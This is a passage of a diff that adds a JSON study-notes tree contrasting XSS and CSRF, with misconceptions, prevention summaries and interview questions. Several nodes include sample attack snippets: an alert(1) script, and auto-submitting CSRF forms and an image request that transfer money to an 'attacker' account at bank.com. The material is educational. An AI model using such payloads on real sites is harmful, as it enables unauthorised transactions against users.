+      "notes": "| Aspect | XSS | CSRF |\n| --- | --- | --- |\n| Attack Goal | Execute scripts in browser | Trick user into submitting request |\n| Execution Location | Browser (client-side) | Server (server-side) |\n| Target | Other users | Authenticated users (usually victim) |\n| Attack Vector | Script injection | Form submission |\n| Requires Auth? | No | Yes |\n| Primary Prevention | Output encoding | CSRF tokens |\n| Secondary Prevention | CSP | SameSite cookies |\n| Attack Example | <script>alert(1)</script> | <form><input></form> |",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "na88cbc15f0d68a7",
+          "title": "Quick Decision Guide",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nf2c720cc2863f20",
+              "title": "When to Focus on XSS Protection",
+              "markdown": "User input displayed in pages - User-generated content - Search functionality - Comment/forum features - URL parameters reflected",
+              "notes": "User input displayed in pages - User-generated content - Search functionality - Comment/forum features - URL parameters reflected",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "nc4ac2d46d830931",
+                  "title": "User input displayed in pages",
+                  "markdown": "- User input displayed in pages",
+                  "notes": "User input displayed in pages",
+                  "blurb": "User input displayed in pages",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n98722d01dd2ad28",
+                  "title": "User-generated content",
+                  "markdown": "- User-generated content",
+                  "notes": "User-generated content",
+                  "blurb": "User-generated content",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n3273db0825fa1a9",
+                  "title": "Search functionality",
+                  "markdown": "- Search functionality",
+                  "notes": "Search functionality",
+                  "blurb": "Search functionality",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n583d4a41bbfce82",
+                  "title": "Comment/forum features",
+                  "markdown": "- Comment/forum features",
+                  "notes": "Comment/forum features",
+                  "blurb": "Comment/forum features",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n48ffdd398f3e2da",
+                  "title": "URL parameters reflected",
+                  "markdown": "- URL parameters reflected",
+                  "notes": "URL parameters reflected",
+                  "blurb": "URL parameters reflected",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "User input displayed in pages - User-generated content - Search...",
+              "expanded": false
+            },
+            {
+              "id": "n0ba72929a6c8d39",
+              "title": "When to Focus on CSRF Protection",
+              "markdown": "State-changing operations - POST/PUT/DELETE endpoints - User authentication required - Account settings changes - Financial transactions",
+              "notes": "State-changing operations - POST/PUT/DELETE endpoints - User authentication required - Account settings changes - Financial transactions",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "nd3c6d61cc44d641",
+                  "title": "State-changing operations",
+                  "markdown": "- State-changing operations",
+                  "notes": "State-changing operations",
+                  "blurb": "State-changing operations",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n15f84acce1f8ddf",
+                  "title": "POST/PUT/DELETE endpoints",
+                  "markdown": "- POST/PUT/DELETE endpoints",
+                  "notes": "POST/PUT/DELETE endpoints",
+                  "blurb": "POST/PUT/DELETE endpoints",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nb7daca52f72734b",
+                  "title": "User authentication required",
+                  "markdown": "- User authentication required",
+                  "notes": "User authentication required",
+                  "blurb": "User authentication required",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n6328f5abff8ed5f",
+                  "title": "Account settings changes",
+                  "markdown": "- Account settings changes",
+                  "notes": "Account settings changes",
+                  "blurb": "Account settings changes",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n4ebbfefe716e4c3",
+                  "title": "Financial transactions",
+                  "markdown": "- Financial transactions",
+                  "notes": "Financial transactions",
+                  "blurb": "Financial transactions",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "State-changing operations - POST/PUT/DELETE endpoints - User authentication...",
+              "expanded": false
+            },
+            {
+              "id": "n984fd12c07ce20f",
+              "title": "Always Protect Against Both",
+              "markdown": "Implement XSS protection (encoding, CSP) - Implement CSRF protection (tokens, SameSite) - Defense in depth approach",
+              "notes": "Implement XSS protection (encoding, CSP) - Implement CSRF protection (tokens, SameSite) - Defense in depth approach",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n7ee1be6e85cde2a",
+                  "title": "Implement XSS protection (encoding, CSP)",
+                  "markdown": "- Implement XSS protection (encoding, CSP)",
+                  "notes": "Implement XSS protection (encoding, CSP)",
+                  "blurb": "Implement XSS protection (encoding, CSP)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n45a08fb03401f62",
+                  "title": "Implement CSRF protection (tokens, SameSite)",
+                  "markdown": "- Implement CSRF protection (tokens, SameSite)",
+                  "notes": "Implement CSRF protection (tokens, SameSite)",
+                  "blurb": "Implement CSRF protection (tokens, SameSite)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc42731121c5ab5c",
+                  "title": "Defense in depth approach",
+                  "markdown": "- Defense in depth approach",
+                  "notes": "Defense in depth approach",
+                  "blurb": "Defense in depth approach",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Implement XSS protection (encoding, CSP) - Implement CSRF protection...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes When to Focus on XSS Protection",
+          "expanded": false
+        },
+        {
+          "id": "n7b548b2752f9caa",
+          "title": "Key Takeaways",
+          "markdown": "XSS and CSRF are different - different goals, mechanisms, mitigations - Preventing one doesn't prevent the other - both must be addressed - CSRF doesn't require XSS - works independently - XSS is more versatile -...",
+          "notes": "XSS and CSRF are different - different goals, mechanisms, mitigations - Preventing one doesn't prevent the other - both must be addressed - CSRF doesn't require XSS - works independently - XSS is more versatile -...",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n4996c4786f33b00",
+              "title": "XSS and CSRF are different - different goals, mechanisms, mitigations",
+              "markdown": "- XSS and CSRF are different - different goals, mechanisms, mitigations",
+              "notes": "XSS and CSRF are different - different goals, mechanisms, mitigations",
+              "blurb": "XSS and CSRF are different - different goals, mechanisms, mitigations",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nc2bf3940dbf285d",
+              "title": "Preventing one doesn't prevent the other - both must be addressed",
+              "markdown": "- Preventing one doesn't prevent the other - both must be addressed",
+              "notes": "Preventing one doesn't prevent the other - both must be addressed",
+              "blurb": "Preventing one doesn't prevent the other - both must be addressed",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nc3241a4f8b9def7",
+              "title": "CSRF doesn't require XSS - works independently",
+              "markdown": "- CSRF doesn't require XSS - works independently",
+              "notes": "CSRF doesn't require XSS - works independently",
+              "blurb": "CSRF doesn't require XSS - works independently",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n24a27364789b57a",
+              "title": "XSS is more versatile - multiple attack vectors beyond cookie theft",
+              "markdown": "- XSS is more versatile - multiple attack vectors beyond cookie theft",
+              "notes": "XSS is more versatile - multiple attack vectors beyond cookie theft",
+              "blurb": "XSS is more versatile - multiple attack vectors beyond cookie theft",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "neb0a13f6fe256c6",
+              "title": "Both can be combined - XSS can bypass CSRF protection",
+              "markdown": "- Both can be combined - XSS can bypass CSRF protection",
+              "notes": "Both can be combined - XSS can bypass CSRF protection",
+              "blurb": "Both can be combined - XSS can bypass CSRF protection",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "XSS and CSRF are different - different goals, mechanisms, mitigations -...",
+          "expanded": false
+        }
+      ],
+      "blurb": "| Aspect | XSS | CSRF | | --- | --- | --- | | Attack Goal | Execute scripts..."
+    },
+    {
+      "id": "n532623e1bec40b1",
+      "title": "Misconceptions",
+      "markdown": "",
+      "notes": "",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "nf25edbd77693206",
+          "title": "Common Misconceptions",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n7417bac96bfdc73",
+              "title": "\"XSS and CSRF are the same attack\"",
+              "markdown": "**Truth:** XSS and CSRF are **completely different** attacks with different goals, mechanisms, and mitigations.\n\n**XSS (Cross-Site Scripting):**",
+              "notes": "Truth: XSS and CSRF are completely different attacks with different goals, mechanisms, and mitigations.\n\nXSS (Cross-Site Scripting):",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n40dde86250e5cc3",
+                  "title": "Goal: Execute malicious scripts in victim's browser",
+                  "markdown": "- Goal: Execute malicious scripts in victim's browser",
+                  "notes": "Goal: Execute malicious scripts in victim's browser",
+                  "blurb": "Goal: Execute malicious scripts in victim's browser",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "na0260094e4dab94",
+                  "title": "Mechanism: Inject scripts into web pages",
+                  "markdown": "- Mechanism: Inject scripts into web pages",
+                  "notes": "Mechanism: Inject scripts into web pages",
+                  "blurb": "Mechanism: Inject scripts into web pages",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n8c51f5c3e7b4f55",
+                  "title": "Target: Other users viewing the page",
+                  "markdown": "- Target: Other users viewing the page",
+                  "notes": "Target: Other users viewing the page",
+                  "blurb": "Target: Other users viewing the page",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n3620624013f9eba",
+                  "title": "Prevention: Output encoding, CSP",
+                  "markdown": "- Prevention: Output encoding, CSP",
+                  "notes": "Prevention: Output encoding, CSP",
+                  "blurb": "Prevention: Output encoding, CSP",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n209195c8dfa3f71",
+                  "title": "Goal: Trick victim into submitting requests",
+                  "markdown": "- Goal: Trick victim into submitting requests",
+                  "notes": "Goal: Trick victim into submitting requests",
+                  "blurb": "Goal: Trick victim into submitting requests",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ne82de94c16661fc",
+                  "title": "Mechanism: Exploit browser's automatic cookie sending",
+                  "markdown": "- Mechanism: Exploit browser's automatic cookie sending",
+                  "notes": "Mechanism: Exploit browser's automatic cookie sending",
+                  "blurb": "Mechanism: Exploit browser's automatic cookie sending",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n26854c376283aa7",
+                  "title": "Target: Authenticated users (usually the victim themselves)",
+                  "markdown": "- Target: Authenticated users (usually the victim themselves)",
+                  "notes": "Target: Authenticated users (usually the victim themselves)",
+                  "blurb": "Target: Authenticated users (usually the victim themselves)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n052cb6a78927dfa",
+                  "title": "Prevention: CSRF tokens, SameSite cookies",
+                  "markdown": "- Prevention: CSRF tokens, SameSite cookies",
+                  "notes": "Prevention: CSRF tokens, SameSite cookies",
+                  "blurb": "Prevention: CSRF tokens, SameSite cookies",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Truth: XSS and CSRF are completely different attacks with different goals,...",
+              "expanded": false
+            },
+            {
+              "id": "nb5acacf0cb6cca7",
+              "title": "\"Preventing XSS also prevents CSRF\"",
+              "markdown": "**Truth:** XSS and CSRF require **different mitigation strategies**. Preventing one does not prevent the other.\n\n**XSS Prevention:**",
+              "notes": "Truth: XSS and CSRF require different mitigation strategies. Preventing one does not prevent the other.\n\nXSS Prevention:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n76f9b049a949862",
+                  "title": "Output encoding",
+                  "markdown": "- Output encoding",
+                  "notes": "Output encoding",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc17a303e1c01dd3",
+                  "title": "Content Security Policy (CSP)",
+                  "markdown": "- Content Security Policy (CSP)",
+                  "notes": "Content Security Policy (CSP)",
+                  "blurb": "Content Security Policy (CSP)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n9c6d81988e41194",
+                  "title": "Input validation",
+                  "markdown": "- Input validation",
+                  "notes": "Input validation",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n08e5e830abb6402",
+                  "title": "CSRF tokens",
+                  "markdown": "- CSRF tokens",
+                  "notes": "CSRF tokens",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nb4c4c28eb79ef2e",
+                  "title": "SameSite cookies",
+                  "markdown": "- SameSite cookies",
+                  "notes": "SameSite cookies",
+                  "blurb": "",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ne87b9a29f11f226",
+                  "title": "Origin/Referer header validation",
+                  "markdown": "- Origin/Referer header validation",
+                  "notes": "Origin/Referer header validation",
+                  "blurb": "Origin/Referer header validation",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Truth: XSS and CSRF require different mitigation strategies.",
+              "expanded": false
+            },
+            {
+              "id": "n6ea7004dec4645a",
+              "title": "\"CSRF requires XSS to work\"",
+              "markdown": "**Truth:** CSRF **does not require XSS**. CSRF can work independently of XSS vulnerabilities.\n\n**How CSRF Works Without XSS:**\n\n```html\n\n<form id=\"transfer\" action=\"https://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker_account\" />\n  <input type=\"hidden\" name=\"amount\" value=\"10000\" />\n</form>\n<script>document.getElementById('transfer').submit();</script>\n\n```\n\n**Attack Flow:**",
+              "notes": "Truth: CSRF does not require XSS. CSRF can work independently of XSS vulnerabilities.\n\nHow CSRF Works Without XSS:\n\n<form id=\"transfer\" action=\"https://bank.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attackeraccount\" />\n  <input type=\"hidden\" name=\"amount\" value=\"10000\" />\n</form>\n<script>document.getElementById('transfer').submit();</script>\n\nAttack Flow:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n2f4c49ac0c46489",
+                  "title": "Victim visits attacker's page (evil.com)",
+                  "markdown": "- Victim visits attacker's page (evil.com)",
+                  "notes": "Victim visits attacker's page (evil.com)",
+                  "blurb": "Victim visits attacker's page (evil.com)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n826a9d789f018f5",
+                  "title": "Form automatically submits to bank.com",
+                  "markdown": "- Form automatically submits to bank.com",
+                  "notes": "Form automatically submits to bank.com",
+                  "blurb": "Form automatically submits to bank.com",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n0fcb50473aa5feb",
+                  "title": "Browser includes session cookie (automatic)",
+                  "markdown": "- Browser includes session cookie (automatic)",
+                  "notes": "Browser includes session cookie (automatic)",
+                  "blurb": "Browser includes session cookie (automatic)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nfa6f9415d9f7154",
+                  "title": "Bank processes transfer (trusts cookie)",
+                  "markdown": "- Bank processes transfer (trusts cookie)",
+                  "notes": "Bank processes transfer (trusts cookie)",
+                  "blurb": "Bank processes transfer (trusts cookie)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Truth: CSRF does not require XSS.",
+              "expanded": false
+            },
+            {
+              "id": "n785aea6bd9bbaa7",
+              "title": "\"XSS can only be used to steal cookies\"",
+              "markdown": "**Truth:** XSS can be used for **multiple attack vectors**, not just cookie theft.\n\n**XSS Attack Vectors:**",
+              "notes": "Truth: XSS can be used for multiple attack vectors, not just cookie theft.\n\nXSS Attack Vectors:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n3dbca66e7be1954",
+                  "title": "Cookie Theft: document.cookie",
+                  "markdown": "- Cookie Theft: document.cookie",
+                  "notes": "Cookie Theft: document.cookie",
+                  "blurb": "Cookie Theft: document.cookie",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n4145882548e2385",
+                  "title": "Session Hijacking: Steal session tokens",
+                  "markdown": "- Session Hijacking: Steal session tokens",
+                  "notes": "Session Hijacking: Steal session tokens",
+                  "blurb": "Session Hijacking: Steal session tokens",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n10856cc1bd881ee",
+                  "title": "Keylogging: Capture user input",
+                  "markdown": "- Keylogging: Capture user input",
+                  "notes": "Keylogging: Capture user input",
+                  "blurb": "Keylogging: Capture user input",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ncac81d5a6c71b16",
+                  "title": "Phishing: Fake login forms",
+                  "markdown": "- Phishing: Fake login forms",
+                  "notes": "Phishing: Fake login forms",
+                  "blurb": "Phishing: Fake login forms",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nfea17c76f2d2ce3",
+                  "title": "Defacement: Modify page content",
+                  "markdown": "- Defacement: Modify page content",
+                  "notes": "Defacement: Modify page content",
+                  "blurb": "Defacement: Modify page content",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n7b7559c3602789a",
+                  "title": "Data Theft: Extract sensitive information",
+                  "markdown": "- Data Theft: Extract sensitive information",
+                  "notes": "Data Theft: Extract sensitive information",
+                  "blurb": "Data Theft: Extract sensitive information",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n1e2df61d35da3e1",
+                  "title": "Redirects: Send users to malicious sites",
+                  "markdown": "- Redirects: Send users to malicious sites",
+                  "notes": "Redirects: Send users to malicious sites",
+                  "blurb": "Redirects: Send users to malicious sites",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n64cd64bf92013cf",
+                  "title": "Cryptocurrency Mining: Use victim's CPU",
+                  "markdown": "- Cryptocurrency Mining: Use victim's CPU",
+                  "notes": "Cryptocurrency Mining: Use victim's CPU",
+                  "blurb": "Cryptocurrency Mining: Use victim's CPU",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "Truth: XSS can be used for multiple attack vectors, not just cookie theft.",
+              "expanded": false
+            },
+            {
+              "id": "nfd560ba54b2bdd6",
+              "title": "\"CSRF only affects GET requests\"",
+              "markdown": "**Truth:** CSRF can affect **any state-changing request**, including POST, PUT, DELETE, etc.\n\n**GET Requests (Less Common):**\n\n```html\n<img src=\"http://bank.com/transfer?to=attacker&amount=10000\">\n\n```\n\n**POST Requests (More Common):**\n\n```html\n<form action=\"http://bank.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\">\n  <input name=\"amount\" value=\"10000\">\n</form>\n<script>document.forms[0].submit();</script>\n\n```\n\n**Key Point:** CSRF affects any request that changes server state, regardless of HTTP method.",
+              "notes": "Truth: CSRF can affect any state-changing request, including POST, PUT, DELETE, etc.\n\nGET Requests (Less Common):\n\n<img src=\"http://bank.com/transfer?to=attacker&amount=10000\">\n\nPOST Requests (More Common):\n\n<form action=\"http://bank.com/transfer\" method=\"POST\">\n  <input name=\"to\" value=\"attacker\">\n  <input name=\"amount\" value=\"10000\">\n</form>\n<script>document.forms[0].submit();</script>\n\nKey Point: CSRF affects any request that changes server state, regardless of HTTP method.",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "blurb": "Truth: CSRF can affect any state-changing request, including POST, PUT,...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes \"XSS and CSRF are the same attack\"",
+          "expanded": false
+        },
+        {
+          "id": "ndf4d4584e449590",
+          "title": "Key Takeaways",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nc35f14151386c72",
+              "title": "Understanding",
+              "markdown": "XSS and CSRF are different attacks with different goals and mechanisms",
+              "notes": "XSS and CSRF are different attacks with different goals and mechanisms",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n907ad6fb8b16d11",
+                  "title": "XSS and CSRF are different attacks with different goals and mechanisms",
+                  "markdown": "- XSS and CSRF are different attacks with different goals and mechanisms",
+                  "notes": "XSS and CSRF are different attacks with different goals and mechanisms",
+                  "blurb": "XSS and CSRF are different attacks with different goals and mechanisms",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n9ea5244144c98f6",
+                  "title": "Different mitigations required - preventing one doesn't prevent the other",
+                  "markdown": "- Different mitigations required - preventing one doesn't prevent the other",
+                  "notes": "Different mitigations required - preventing one doesn't prevent the other",
+                  "blurb": "Different mitigations required - preventing one doesn't prevent the other",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc3241a4f8b9def7",
+                  "title": "CSRF doesn't require XSS - works independently",
+                  "markdown": "- CSRF doesn't require XSS - works independently",
+                  "notes": "CSRF doesn't require XSS - works independently",
+                  "blurb": "CSRF doesn't require XSS - works independently",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n09e91c3caf502b1",
+                  "title": "XSS has multiple attack vectors - not just cookie theft",
+                  "markdown": "- XSS has multiple attack vectors - not just cookie theft",
+                  "notes": "XSS has multiple attack vectors - not just cookie theft",
+                  "blurb": "XSS has multiple attack vectors - not just cookie theft",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n8a27aee91859dd0",
+                  "title": "CSRF affects any state-changing request - not just GET",
+                  "markdown": "- CSRF affects any state-changing request - not just GET",
+                  "notes": "CSRF affects any state-changing request - not just GET",
+                  "blurb": "CSRF affects any state-changing request - not just GET",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "XSS and CSRF are different attacks with different goals and mechanisms",
+              "expanded": false
+            },
+            {
+              "id": "n11b1f3b251e8392",
+              "title": "Common Mistakes",
+              "markdown": "\u274c Confusing XSS and CSRF - \u274c Thinking preventing XSS prevents CSRF - \u274c Believing CSRF requires XSS - \u274c Limiting XSS to cookie theft only - \u274c Thinking CSRF only affects GET requests",
+              "notes": "\u274c Confusing XSS and CSRF - \u274c Thinking preventing XSS prevents CSRF - \u274c Believing CSRF requires XSS - \u274c Limiting XSS to cookie theft only - \u274c Thinking CSRF only affects GET requests",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n266d7e34c244eb0",
+                  "title": "Confusing XSS and CSRF",
+                  "markdown": "- Confusing XSS and CSRF",
+                  "notes": "Confusing XSS and CSRF",
+                  "blurb": "Confusing XSS and CSRF",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "ned3e9b102323dab",
+                  "title": "Thinking preventing XSS prevents CSRF",
+                  "markdown": "- Thinking preventing XSS prevents CSRF",
+                  "notes": "Thinking preventing XSS prevents CSRF",
+                  "blurb": "Thinking preventing XSS prevents CSRF",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n7922c066f96f628",
+                  "title": "Believing CSRF requires XSS",
+                  "markdown": "- Believing CSRF requires XSS",
+                  "notes": "Believing CSRF requires XSS",
+                  "blurb": "Believing CSRF requires XSS",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n1302134fd78278d",
+                  "title": "Limiting XSS to cookie theft only",
+                  "markdown": "- Limiting XSS to cookie theft only",
+                  "notes": "Limiting XSS to cookie theft only",
+                  "blurb": "Limiting XSS to cookie theft only",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nc38377d67ee73a6",
+                  "title": "Thinking CSRF only affects GET requests",
+                  "markdown": "- Thinking CSRF only affects GET requests",
+                  "notes": "Thinking CSRF only affects GET requests",
+                  "blurb": "Thinking CSRF only affects GET requests",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                }
+              ],
+              "blurb": "\u274c Confusing XSS and CSRF - \u274c Thinking preventing XSS prevents CSRF - \u274c...",
+              "expanded": false
+            }
+          ],
+          "blurb": "Includes Understanding",
+          "expanded": false
+        },
+        {
+          "id": "n11d75c659ddf5da",
+          "title": "Summary Table",
+          "markdown": "| Aspect | XSS | CSRF |\n| --- | --- | --- |\n| **Attack Goal** | Execute scripts in browser | Trick user into submitting request |\n| **Requires XSS?** | N/A (it IS XSS) | No |\n| **Target** | Other users | Authenticated users (usually victim) |\n| **Prevention** | Output encoding, CSP | CSRF tokens, SameSite cookies |\n| **Affects** | Any request | State-changing requests |\n| **Attack Vector** | Script injection | Form submission |\n\n---\n\nRemember: **XSS and CSRF are different vulnerabilities requiring different mitigation strategies. Both must be addressed separately!**",
+          "notes": "| Aspect | XSS | CSRF |\n| --- | --- | --- |\n| Attack Goal | Execute scripts in browser | Trick user into submitting request |\n| Requires XSS? | N/A (it IS XSS) | No |\n| Target | Other users | Authenticated users (usually victim) |\n| Prevention | Output encoding, CSP | CSRF tokens, SameSite cookies |\n| Affects | Any request | State-changing requests |\n| Attack Vector | Script injection | Form submission |\n\n---\n\nRemember: XSS and CSRF are different vulnerabilities requiring different mitigation strategies. Both must be addressed separately!",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "| Aspect | XSS | CSRF | | --- | --- | --- | | Attack Goal | Execute scripts...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Common Misconceptions"
+    },
+    {
+      "id": "n26ec021ff297e4a",
+      "title": "Interview prompts",
+      "markdown": "",
+      "notes": "",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "n5a37d6401535663",
+          "title": "Comparison Questions",
+          "markdown": "",
+          "notes": "",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "n275d671ad514abd",
+              "title": "What are the key differences between XSS and CSRF?",
+              "markdown": "**Answer:**\n\n**1. Attack Goal:**",
+              "notes": "Answer:\n\n1. Attack Goal:",
+              "kind": "topic",
+              "level": 3,
+              "children": [
+                {
+                  "id": "n2e37599be57a5da",
+                  "title": "XSS: Execute malicious scripts in victim's browser",
+                  "markdown": "- XSS: Execute malicious scripts in victim's browser",
+                  "notes": "XSS: Execute malicious scripts in victim's browser",
+                  "blurb": "XSS: Execute malicious scripts in victim's browser",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "nb992590d838521e",
+                  "title": "CSRF: Trick victim into submitting requests",
+                  "markdown": "- CSRF: Trick victim into submitting requests",
+                  "notes": "CSRF: Trick victim into submitting requests",
+                  "blurb": "CSRF: Trick victim into submitting requests",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n5f2015f8e82debc",
+                  "title": "XSS: Client-side (browser)",
+                  "markdown": "- XSS: Client-side (browser)",
+                  "notes": "XSS: Client-side (browser)",
+                  "blurb": "XSS: Client-side (browser)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n1bce4c0473f6a68",
+                  "title": "CSRF: Server-side (server processes request)",
+                  "markdown": "- CSRF: Server-side (server processes request)",
+                  "notes": "CSRF: Server-side (server processes request)",
+                  "blurb": "CSRF: Server-side (server processes request)",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n1950eb238387afa",
+                  "title": "XSS: Other users viewing the page",
+                  "markdown": "- XSS: Other users viewing the page",
+                  "notes": "XSS: Other users viewing the page",
+                  "blurb": "XSS: Other users viewing the page",
+                  "kind": "topic",
+                  "level": 4,
+                  "children": [],
+                  "expanded": false
+                },
+                {
+                  "id": "n4f2064f2f237ccd",
+                  "title": "CSRF: Authenticated users (usually the victim)",
+                  "markdown": "- CSRF: Authenticated users (usually the victim)",
+                  "notes": "CSRF: Authenticated users (usually the victim)",
+                  "blurb": "CSRF: Authenticated users (usually the victim)",
+                  "kind": "topic",
+                  "level": 4,
